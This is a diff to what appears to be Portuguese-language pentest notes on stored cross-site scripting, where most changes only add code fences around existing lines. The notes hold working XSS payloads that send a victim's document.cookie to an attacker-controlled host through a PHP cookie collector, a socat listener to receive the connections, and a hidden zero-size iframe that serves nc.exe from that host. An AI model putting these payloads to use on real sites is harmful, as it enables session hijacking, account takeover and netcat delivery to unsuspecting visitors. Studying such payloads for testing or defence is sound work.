@@ -6,12 +6,20 @@
 ## XSS Stored
 Possui um impacto maior pois o script fica salvo na página e toda vez que essa página é acessada o script é executado.
 
+```html
 <script>alert(document.cookie)</script>
+```  
+```html
 <script>new Image().src="http://192.168.0.100:8081/";</script>
+```  
+```html
 <script>new Image().src="http://192.168.0.100:8081/";</script>
+```  
 
-Use o socat para receber as conexões:
+Use o socat para receber as conexões:  
+```bash
 socat TCP-LISTEN:8081,reuseaddr,fork -
+```
 
 ### Coletando cookies:
 
@@ -26,10 +34,14 @@ Coletor de cookie:
     fclose($file);
 ?>
 ```
-*Necessário ter um arquivo cookie.txt criado.*
+*Necessário ter um arquivo cookie.txt criado.*  
 
-Script para ser executado no alvo:
+Script para ser executado no alvo:  
+```html
 <script>new Image().src="http://192.168.0.100:8081/coletor.php?cookie="+document.cookie;</script>
+```
 
-### Download de arquivo
+### Download de arquivo  
+```html
 <iframe>src="http://192.168.0.100:8081/nc.exe" height="0" width="0"</iframe>
+```
